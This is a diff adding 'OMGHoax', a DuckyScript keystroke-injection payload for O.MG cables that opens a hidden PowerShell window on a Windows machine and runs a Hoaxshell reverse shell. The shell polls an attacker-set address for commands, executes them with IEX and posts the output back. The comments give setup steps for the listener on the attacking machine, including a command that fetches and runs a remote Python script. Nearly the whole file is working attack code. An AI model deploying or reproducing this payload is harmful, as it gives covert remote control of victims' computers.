@@ -1,0 +1,28 @@
+REM       OMGHoax
+REM       Version 1.0
+REM       OS: Windows
+REM       Author: rf_bandit
+REM       Thank You: t3l3machus, 0iphor13
+REM       Requirements: Firmware Version 3.0+
+
+REM Simple way to use the Hoaxshell standalone listener with OMG cables/plug
+REM	This version uses Powershell IEX PowerShell Constraint Language Mode.
+REM	Payload can be easily adapted to use other HoaxShell PS payloads --- simply paste the payload inside the first set of curly braces after -ScriptBlock
+REM	eg -ScriptBlock { ##PAYLOAD##}
+REM On attacking machineinstall Hoaxshell listener Standalone Listener (https://github.com/t3l3machus/hoaxshell/tree/main/revshells) 
+REM	run python3 hoaxshell-listener.py -t ps-iex-cm   
+REM Or use python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t ps-iex-cm
+REM If you change the port from 8080, pass it hoaxshell-listener.py with -p
+
+
+DUCKY_LANG US
+REM Set address and port of attacking machine
+DEFINE #ADDRESS '0.0.0.0
+DEFINE #PORT 8080'
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd /k
+ENTER
+DELAY 500
+STRINGLN powershell -WindowStyle Hidden Invoke-Command -ScriptBlock {$s=#ADDRESS:#PORT;$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8} }
